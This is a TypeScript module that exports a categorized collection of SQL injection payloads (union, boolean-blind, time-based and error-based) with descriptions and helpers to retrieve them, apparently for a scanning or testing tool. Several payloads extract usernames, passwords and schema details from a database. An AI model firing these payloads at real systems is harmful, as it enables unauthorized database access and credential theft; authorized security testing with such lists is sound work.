export const sqlInjectionPayloads = {
  'union-based': [
    {
      payload: "' UNION SELECT 1,2,3--",
      description: "Basic union injection with comment termination"
    },
    {
      payload: "' UNION SELECT NULL,NULL,NULL--",
      description: "Union injection with NULL values"
    },
    {
      payload: "' UNION SELECT user(),version(),database()--",
      description: "Union injection to extract database information"
    },
    {
      payload: "' UNION SELECT username,password,email FROM users--",
      description: "Union injection targeting user credentials"
    },
    {
      payload: "1' UNION SELECT 1,table_name,column_name FROM information_schema.columns--",
      description: "Schema enumeration via union injection"
    }
  ],
  'boolean-based': [
    {
      payload: "' AND 1=1--",
      description: "True condition boolean injection"
    },
    {
      payload: "' AND 1=2--",
      description: "False condition boolean injection"
    },
    {
      payload: "' AND (SELECT COUNT(*) FROM users)>0--",
      description: "Boolean injection testing table existence"
    },
    {
      payload: "' AND (SELECT substring(username,1,1) FROM users LIMIT 1)='a'--",
      description: "Character-by-character data extraction"
    },
    {
      payload: "' AND ASCII(substring((SELECT password FROM users LIMIT 1),1,1))>64--",
      description: "ASCII-based boolean blind injection"
    }
  ],
  'time-based': [
    {
      payload: "'; WAITFOR DELAY '00:00:05'--",
      description: "SQL Server time delay injection"
    },
    {
      payload: "' AND (SELECT SLEEP(5))--",
      description: "MySQL time delay injection"
    },
    {
      payload: "'; SELECT pg_sleep(5)--",
      description: "PostgreSQL time delay injection"
    },
    {
      payload: "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(2))--",
      description: "Conditional time-based injection"
    },
    {
      payload: "1' AND IF(1=1,SLEEP(5),0)--",
      description: "Conditional MySQL time delay"
    }
  ],
  'error-based': [
    {
      payload: "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
      description: "MySQL extractvalue error injection"
    },
    {
      payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      description: "MySQL floor error injection"
    },
    {
      payload: "' AND CAST((SELECT user()) AS int)--",
      description: "CAST conversion error injection"
    },
    {
      payload: "' OR 1=CONVERT(int,(SELECT @@version))--",
      description: "SQL Server CONVERT error injection"
    },
    {
      payload: "' AND 1=1/0--",
      description: "Division by zero error injection"
    }
  ]
};

export const getPayloadsByType = (type: string) => {
  return sqlInjectionPayloads[type as keyof typeof sqlInjectionPayloads] || [];
};

export const getAllPayloads = () => {
  return Object.values(sqlInjectionPayloads).flat();
};
